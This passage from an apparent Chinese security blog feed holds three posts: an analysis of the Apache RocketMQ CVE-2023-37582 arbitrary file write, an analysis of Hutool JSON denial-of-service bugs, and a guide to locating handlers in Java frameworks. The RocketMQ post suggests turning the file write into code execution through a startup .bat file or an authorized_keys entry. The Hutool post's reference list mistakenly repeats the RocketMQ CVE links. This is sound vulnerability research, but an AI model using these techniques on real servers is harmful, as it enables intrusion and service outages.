%logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 设置日志输出级别 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 自定义logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>环境配置完成后运行主类<code>org.apache.rocketmq.broker.NameSrvStartup</code>启动<code>ROCKETMQ NameServer</code>，控制台输出以下内容则<code>NameServer</code>启动成功</p>
<p><img src="/archives/968babfb/image-20230724103631325.png" alt="image-20230724103631325"></p>
<p>运行主类<code>org.apache.rocketmq.broker.BrokerStartup</code>启动<code>ROCKETMQ Broker</code>，控制台输出以下内容则<code>Broker</code>启动成功</p>
<p><img src="/archives/968babfb/image-20230724103711506.png" alt="image-20230724103711506"></p>
<p>日志中提示了<code>Broker</code>监听地址与<code>NameServer</code>地址。</p>
<p><strong>靶场搭建</strong></p>
<p>调试环境可用于测试PoC</p>
<h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>为了更清晰地了解该漏洞，我们仍需了解<code>NameServer</code>的启动过程。另一方面，该漏洞是针对<code>NameServer</code>的攻击与<code>Broker</code>关系不大，了解<code>NameServer</code>的启动过程将更有助于我们分析漏洞。</p>
<p><img src="/archives/968babfb/image-20230724104157525.png" alt="image-20230724104157525"></p>
<p>在<code>org.apache.rocketmq.namesrv.NamesrvStartup</code>类中，启动阶段的关键代码出现在第57与58行。启动时首先要做的是创建<code>NameSrvController</code>进行初始化，然后再执行<code>start</code>流程。</p>
<p>创建<code>Controller</code>过程中主要进行了命令行参数解析、配置文件解析、日志配置解析并将相关的配置映射到注册<code>namesrvConfig</code>与<code>nettyServerConfig</code>两个对象中并向<code>Controller</code>注册</p>
<p><img src="/archives/968babfb/image-20230724105127793.png" alt="image-20230724105127793"></p>
<p><code>start</code>启动过程中最终会调用到<code>org.apache.rocketmq.remoting.netty.NettyRemotingServer</code>的<code>start</code>方法</p>
<p><img src="/archives/968babfb/image-20230724105757412.png" alt="image-20230724105757412"></p>
<p><img src="/archives/968babfb/image-20230724105828274.png" alt="image-20230724105828274"></p>
<p>该方法主要完成了各类处理器的初始化、Netty解码器与消息处理器的注册、监听服务的启动。</p>
<p>其中<code>encoder</code>负责<code>RocketMQ</code>协议消息头的解析与消息体的提取，最终形成字节流传递给<code>serverHandler</code>进行处理。</p>
<p><img src="/archives/968babfb/image-20230724110057582.png" alt="image-20230724110057582"></p>
<p><code>serverHandler</code>会根据不同的消息类型选择不同的处理方式</p>
<p><img src="/archives/968babfb/image-20230724110245393.png" alt="image-20230724110245393"></p>
<p>在进行<code>Request</code>类型消息处理时会先选择处理器类型，然后调用其<code>processRequest</code>方法进行具体的消息处理</p>
<p><img src="/archives/968babfb/image-20230724110444420.png" alt="image-20230724110444420"></p>
<p>默认使用的消息处理器类为<code>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor</code>，其<code>processRequest</code>方法会根据请求中的<code>code</code>参数选择不同的处理方式。</p>
<p><img src="/archives/968babfb/image-20230724110816397.png" alt="image-20230724110816397"></p>
<p>在监听服务启动后，<code>netty</code>将按照每秒1次的频率不断获取监听端口信息，然后一次调用d<code>ecoder</code>、<code>handle</code>r对消息进行处理，上面就是<code>Namesrv</code>的简单启动流程。</p>
<p>有趣的是当<code>org.apache.rocketmq.namesrv.processor.DefaultRequestProcessor#processRequest</code> 第88行<code>request.getCode</code>方法的结果为<code>318</code>时则进入到配置更新流程</p>
<p><img src="/archives/968babfb/image-20230724111434267.png" alt="image-20230724111434267"></p>
<p>在<code>updateConfig</code>方法中首先会获取请求体对象然后转换为字符串，然后将字符串转换为properties对象,最终将properties更新到configuration对象中</p>
<p><img src="/archives/968babfb/image-20230724111817726.png" alt="image-20230724111817726"></p>
<p><code>this.namesrvController.getConfiguration()</code>获取到的是一个Configuration对象，然后调用其<code>update</code>方法进行配置更新</p>
<p><img src="/archives/968babfb/image-20230724112214708.png" alt="image-20230724112214708"></p>
<p><code>org.apache.rocketmq.common.Configuration#update</code>方法首先将用户请求体的配置信息合并到<code>this.allconfigs</code>中，然后遍历<code>configObjectList</code>对象成员，再将配置信息合并到其中。从上图我们知道<code>configObjectList</code>包含两个对象分别是程序启动过程中对<code>configuration</code>初始化时传入的<code>NamesrvConfig</code>与<code>NettyServerConfig</code>对象。完成配置在内存态的更新后调用<code>persist</code>方法对配置进行持久化。</p>
<p><img src="/archives/968babfb/image-20230724112353518.png" alt="image-20230724112353518"></p>
<p><code>persist</code>方法完成了在内存中实时的配置信息的持久化，其首先会调用<code>getAllConfigsInternal</code>方法获取所有配置，然后调用<code>getStorePath</code>方法获取到配置的存储路径，最终调用<code>string2File</code>方法以前两个要素为参数配置持久化到硬盘。</p>
<p><img src="/archives/968babfb/image-20230724134008018.png" alt="image-20230724134008018"></p>
<p>一般来讲，任意文件上传漏洞需要满足两个条件，一是文件的后缀名可控，二是文件的内容可控。对于该漏洞来说我们通过<code>getAllConfigsInternal</code>获取到文件内容，通过<code>getStorePath</code>获取到文件路径。那么这两者是否可控呢？</p>
<p>我们来看<code>getAllConfigsInternal</code>方法，该方法主要做了两件事，一是遍历<code>configObjectList</code>对象然后将其成员转换为<code>properties</code>对象，二是将<code>properties</code>对象序列化为字符串。从前面我们知道<code>configObjectList</code>对象可以被用户通过<code>code</code>为<code>318</code>的请求修改，也就是说文件内容是可控的。</p>
<p><img src="/archives/968babfb/image-20230724134512621.png" alt="image-20230724134512621"></p>
<p>再看<code>getStorePath</code>方法，在第<code>156</code>行有很明显的反射调用，获取的值是<code>NamesrvConfig</code>对象中<code>configStorePath</code>字段的值。</p>
<p><img src="/archives/968babfb/image-20230724140738246.png" alt="image-20230724140738246"></p>
<p>在<code>update</code>方法中185行我们知道，用户请求体中的配置会修改<code>NamesrvConfig</code>的属性，故持久化的配置文件的存储路径也是可变的，于是便构成了任意文件上传的两个要素。</p>
<p>我们使用互联网流传的PoC对漏洞进行验证，因为本文的复现环境为Windows所以需要对PoC进行适当的修改，可以看到在PoC中，用户发送给<code>NameServer</code>的请求体数据为两个通过换行符分割的键值对类型数据，分别为<code>configStorePath</code>与<code>productEnvName</code>，其中<code>configStorePath</code>负责指定配置文件的存储路径，<code>productEnvName</code>只是用于验证配置是否写入成功。</p>
<p><img src="/archives/968babfb/image-20230724142757605.png" alt="image-20230724142757605"></p>
<p>执行验证脚本</p>
<p><img src="/archives/968babfb/image-20230724142220826.png" alt="image-20230724142220826"></p>
<p>到启动目录查看发现文件写入成功</p>
<p><img src="/archives/968babfb/image-20230724142657752.png" alt="image-20230724142657752"></p>
<p>若需要进行命令执行只需要向启动目录里写入bat文件即可</p>
<p><img src="/archives/968babfb/image-20230724151317005.png" alt="image-20230724151317005"></p>
<p>或者向.ssh文件夹下的authorized_keys中写入新的公钥（未验证）</p>
<p>最后放上调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">persist:<span class="number">208</span>, Configuration (org.apache.rocketmq.common)</span><br><span class="line">update:<span class="number">198</span>, Configuration (org.apache.rocketmq.common)</span><br><span class="line">updateConfig:<span class="number">584</span>, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">processRequest:<span class="number">131</span>, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">asyncProcessRequest:<span class="number">26</span>, AsyncNettyRequestProcessor (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:<span class="number">227</span>, NettyRemotingAbstract$<span class="number">1</span> (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:<span class="number">80</span>, RequestTask (org.apache.rocketmq.remoting.netty)</span><br><span class="line">call:<span class="number">511</span>, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run$$$capture:<span class="number">266</span>, FutureTask (java.util.concurrent)</span><br><span class="line">run:-<span class="number">1</span>, FutureTask (java.util.concurrent)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>1、非必须勿向互联网开放不必要的服务端口，控制暴露面；</p>
<p>2、关键服务增加用户权限校验；</p>
<p>3、升级软件到不受影响的版本或最新版。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
</ul>
<h2 id="软安解决方案"><a href="#软安解决方案" class="headerlink" title="软安解决方案"></a>软安解决方案</h2>]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>Apache RocketMQ</tag>
        <tag>RCE</tag>
        <tag>远程代码执行</tag>
        <tag>反序列化</tag>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
        <tag>CVE-2023-37582</tag>
      </tags>
  </entry>
  <entry>
    <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
    <url>/archives/3f6576a1.html</url>
    <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2022-45690： 该项目受影响版本存在拒绝服务漏洞，由于org.json.JSONTokener.nextValue::JSONTokener.java组件中并未检验json的嵌套深度。攻击者可以通过构造特制的JSON或XML数据在程序解析时导致JVM溢出从而实现拒绝服务(DoS)攻击。</p>
<p>CVE-2022-45689：该项目受影响版本存在拒绝服务漏洞，由于JSONObject.java中JSONObject方法对于要解析的json并未检验是否合法，在后续解析JSON时就会因为内存不足而造成拒绝服务漏洞。</p>
<span id="more"></span>

<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt; Hutool 5.8.11</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入<code>hutool</code>包</p>
<p><img src="/archives/3f6576a1/image-20230811111844774.png" alt="image-20230811111844774"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写测试类</p>
<p><img src="/archives/3f6576a1/image-20230811112000265.png" alt="image-20230811112000265"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般我们复现漏洞时都需要利用一些泄露的有关漏洞的信息，比如别人发的通告中未打码完全的截图、漏洞描述等信息，这里我们从阿里云漏洞库的描述中了解到该漏洞的大致情况：</p>
<p><img src="/archives/3f6576a1/image-20230811112316260.png" alt="image-20230811112316260"></p>
<p>里面有两个关键信息，一是嵌套深度、二是栈溢出，那这不妥妥的无线递归导致的栈溢出漏洞吗？先整2000层嵌套打一下试试：</p>
<p><img src="/archives/3f6576a1/image-20230811133440365.png" alt="image-20230811133440365"></p>
<p>果然栈溢出了，打完收工，回家吹空调了。</p>
<p>啥？你说这太简单了，你想学点硬货？行，那咱上硬货。</p>
<p>这个漏洞分析第一步肯定时先把断点打起来，我们发现所谓的<code>parseObj</code>其实就是new了一个<code>JSONObject</code>对象。</p>
<p><img src="/archives/3f6576a1/image-20230811133657015.png" alt="image-20230811133657015"></p>
<p>创建对象时会调用<code>init</code>方法，在该方法中会根据我们输入的参数类型选择不同的重载函数进行解析，我们输入的时个字符串，所以会进入到第680行的逻辑里。</p>
<p><img src="/archives/3f6576a1/image-20230811133906215.png" alt="image-20230811133906215"></p>
<p>这里干的什么注释说的已经很清楚了</p>
<p><img src="/archives/3f6576a1/image-20230811134053659.png" alt="image-20230811134053659"></p>
<p>这里有两个函数解释以下，首先时<code>nextClean</code>会去获取json字符串的token也就是<code>&quot; &#123; &#125; : [ ]</code>这一些，<code>nextValue</code>会去获取json字符串键对应的值。这个漏洞就出现在757行将json的键值对，往JSONObject对象里放的时候，在获取json值得时候会调用netValue函数。</p>
<p><img src="/archives/3f6576a1/image-20230811134202285.png" alt="image-20230811134202285"></p>
<p>这个函数会根据从<code>:</code>后解析到得第一个token类型去调用不同得逻辑，当解析的token为<code>&#123;</code>时就会再new一个JSONObject对象。啊，这这这，这不就递归了吗？</p>
<p><img src="/archives/3f6576a1/image-20230811134541231.png" alt="image-20230811134541231"></p>
<p>我们知道递归过程中函数会不断地压栈，而栈空间是有限地，如果不断地压栈而不弹栈地话就会导致栈溢出，所以需要一个基例来帮助函数解析到最深处能够回退，而在json字符串解析过程中就是当解析到最后一个<code>&#123;</code>时开始回退。但是这个json字符串地长度再这里我们若是可以控制地话，就可以先搞几万层嵌套让它一直压栈直到溢出为止，因为再分析过程中并没有看到代码中有对嵌套深度地限制。</p>
<p>这个漏洞是栈溢出漏洞，而（CVE-2022-45689）确实一个实打实得堆溢出漏洞，一般来说堆溢出时非常少见得，应为JVM堆是非常大的，我们可以使用下面的代码答应一下一个普通的java程序运行时JVM可用的堆内存情况。</p>
<p><img src="/archives/3f6576a1/image-20230811152225458.png" alt="image-20230811152225458"></p>
<p>从结果来看JVM初始化时使用的总的堆内存为241MB，而可用的最到堆内存达到3GB，一般来说时很难发生溢出的。我们知道，JVM堆内存中一般存储的时java对象，要想要JVM堆发生溢出也就是说要有大量的没有被GC回收的对象占满了内存，但是如果只是单纯得常见对象，这些对象在沾满了幸存者0区后会被GC清除掉，一般也不会导致堆溢出，除非这些对象时不可清除得，那么什么情况下得对象时不可清除得呢。GC在进行垃圾回收时可以采用多种策略，其中包括引用计数法，即查看一个对象是否有被别得对象引用，如果没有则可以清除，如果有则不清除，但是这个算法有缺陷解决不了循环引用得问题，所以又有了可达性分析算法，及从一系列得GC Roots开始分析一个对象得可达性，如果这个对象不可达则进行清除。在这个例子中进行JSONObject解析递归到最深层进行返回时，每一个<code>&#123;xx:1&#125;</code>都将被new为一个新的<code>JSONObject</code>对象并被不断地引用嵌套，最终所有的<code>JSONObject</code>对象一起链接在一起占满了堆内存，我们可以使用jconsole来观察一下JVM的堆内存变化情况：</p>
<p><img src="/archives/3f6576a1/image-20230811153435062.png" alt="image-20230811153435062"></p>
<p>jconsole可能不太直观，可以下载<code>virtual VM</code>进行监控</p>
<p>下载地址：<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
<p><img src="/archives/3f6576a1/image-20230811154033340.png" alt="image-20230811154033340"></p>
<p>最开始我们的程序休眠了20秒（为了给jconsole链接提供时间）休眠结束后开始进行json字符串的解析，开始阶段应为还没有递归到最深处所以堆内存增加量不大，在递归达到最深处函数不断返回时，堆内存空间的消耗不断走高，最终耗尽内存资源导致堆溢出。我们把高峰期的堆内存dump出来</p>
<p><img src="/archives/3f6576a1/image-20230811154905943.png" alt="image-20230811154905943"></p>
<p>可以看到足足1.7G的内存都被我们的json字符串占据。</p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releases。</a></li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
        <tag>Hutool</tag>
        <tag>JSONUtil拒绝服务漏洞</tag>
        <tag>CVE-2022-45690</tag>
        <tag>CVE-2022-45689</tag>
        <tag>DoS</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA生态常见架构介绍、配置与逻辑定位方法</title>
    <url>/archives/b5364c9e.html</url>
    <content><![CDATA[<p>不知道你在挖洞过程中是否碰到过这样一个问题，资源下载到了，调试环境也搞定了却迟迟找不到合适的地方下断点进行调试，这时候你会选择怎么办？<br>是去寻找启动类一行一行代码查看直到找到URI的处理函数，还是快准狠地定位到关键点马上出洞？我想不会有人想要选择第一种方法，<br>但按照第一种方法不断地熟悉不同的框架的过程却是一个挖洞小白向大佬进化的过程，我们往往需要在这个过程中不断地积累足够的经验来熟悉常见的技术与框架，<br>这几乎是每一个大佬成长路上必须要走的路。毫无疑问，这种曲折的过程最能增长人们的能力，不过这个过程往往是痛苦且枯燥的，在挖洞过程中，时间紧任务重的情况下，<br>我们往往在这个过程中浪费了大量的时间与精力，所以我给大家简单总结了一下我们应该如何去找到一些常见框架进行资源处理与存放、配置存放与解析规则的方法。</p>
<span id="more"></span>

<h1 id="jetty"><a href="#jetty" class="headerlink" title="jetty"></a>jetty</h1><p>与<code>tomcat</code>一样，<code>jetty</code>也是一个<code>jsp</code>与<code>servlet</code>的容器，不过相比<code>tomcat</code>，其功能更加精简，整个程序的构建逻辑也与<code>tomcat</code>也有较大的差异，<br>不过既然是<code>servlet</code>容器那么其将遵循与<code>tomcat</code>一样的servlet规范，如配置在<code>web.xml</code>中的<code>servlet-mapping</code>与<code>filter-mapping</code>等。<br>对于漏洞挖掘来讲，其并没有太过独特的地方，我们重点关注的也就是web.xml中的配置信息，然后找到对应的请求处理方法进行审计即可。</p>
<h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><p>在<code>spring mvc</code>火起来前，<code>struts</code>就是比较流行的<code>MVC</code>框架了，与<code>spring mvc</code>类似，<code>struts</code>也是采用类似前端控制器的方式来进行请求的分发，<br>不过<code>struts2</code>是通过<code>filter(StrutsPrepareAndExecuteFilter)</code>的方式进行分发，而spring是通过<code>servlet</code>，两者没有本质的区别。</p>
<p><code>struts2</code>的请求处理方法与<code>spring</code>中的<code>controller</code>不同，在<code>struts</code>中其被称为<code>Action</code>，每个<code>Action</code>负责一个请求的处理，这些<code>Action</code>类默认使用<code>execute</code>方法进行请求处理，<br>不过也可以在配置文件中通过通过<code>action</code>标签属性<code>method</code>进行指定。</p>
<p><code>struts2</code>的配置文件名为<code>struts.xml</code>，在实践中<code>struts</code>往往作为一个入口，具体的<code>Action</code>配置注册通过<code>include</code>的方式在其他配置文件中实现，<br>一般相似功能的<code>action</code>注册在一个文件中，如与登录相关的<code>action</code>可以放在一个文件中再将该文件包含到<code>struts.xml</code>中。</p>
<p><code>struts2 action</code>是被<code>package</code>管理的，每个<code>package</code>标签下往往有多个<code>action</code>标签，每个<code>action</code>标签可以处理一个或多个请求，具体通过对标签属性<code>name</code>使用通配符的方式进行，<br>标签属性<code>class</code>指定<code>action</code>的处理类。<code>action</code>标签下的子标签<code>result</code>能够根据请求处理方法返回的字符串加载不同的资源进行视图渲染来进行响应。</p>
<p>如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*loginAction&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.www.LoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上例注册的<code>action</code>将会匹配所有以<code>loginAction</code>结尾的请求，并将请求交到<code>LoginAction</code>类进行处理，调用的方法是被<code>name</code>属性通配符匹配到的字符串同名的方法。<br>方法调用成功后返回<code>success</code>将加载<code>index.jsp</code>渲染响应给客户端。</p>
<h1 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h1><p><code>spring boot</code>可能实在没有什么值得多说的，因为大家都太熟了，一个严格遵循<code>MVC</code>规范开发的程序，挖洞的标准步骤可能就是先在<code>web.xml</code>中查看配置看看<code>filter</code>有哪些 <code>servlet</code>有哪些，<br>然后去瞅瞅对应的<code>servlet</code>与<code>filter</code>的功能，能挖到洞就皆大欢喜，挖不倒就拉倒。可能这个流程太过标准我们往往忽视了一些其他的细节。使用<code>spring boot</code>单独打包的程序可能这些配置的位置很好找，<br>但一个大型应用动辄就是几百个<code>jar</code>包，这些不同的功能可能被拆开打包到不同的<code>jar</code>包，这时候是不是就抓瞎了？难道要一个一个地去点开看？当然没必要。</p>
<p>首先，我们还是程序性得确定一下<code>spring boot</code>打包的<code>jar</code>包的结构，其与其他标准<code>jar</code>包略有差异，除了标准的<code>meta-inf</code>文件夹存放一些元信息以外，<br>还多了一个<code>boot-inf</code>的文件夹，这个<code>boot-inf</code>文件夹下的内容才是我们真正的启动类，在<code>meta-inf</code>文件夹下有个<code>MANIFEST.MF</code>文件，我们在这个文件中找到两个属性<code>Main-Class</code> 与 <code>Start-Class</code>，<br>其中<code>Main-Class</code>指定的就是<code>spring boot</code>的启动类，而<code>Start-Class</code>指定的就是我们编写的启动类。</p>
<p>言归正传，我们重点是在庞杂的<code>jar</code>包中找到真正存放请求处理类的<code>jar</code>包，那么如何快速定位呢？我们知道<code>Spring Web</code>是通过前端控制器<code>DispatcherServlet</code>来进行请求的分发的，<br>在<code>DispatcherServlet</code>中方法<code>doDispatch</code>负责具体的分发逻辑，其中<code>DispatcherServlet this</code>对象的<code>handlerMappings</code> 属性存放的就是所有的注册的所有请求的处理对象，<br>当用户请求到来时将从这个<code>map</code>中取得对应的<code>handlerMapping</code>调用对应的方法对请求进行处理，故我们只需要遍历<code>handlerMappings</code>就可以找到<code>controlle</code>所在的位置了。具体的操作可能不太方便描述，<br>我们只需要逐级展开该对象获取器属性，然后找到带<code>controller</code>字样的属性然后鼠标右键选择<code>jump to type source</code>就可以跳转到类型的定义为止。当然我讲的这些都是在调试环境下进行的。<br><img src="/archives/b5364c9e/640.webp"></p>
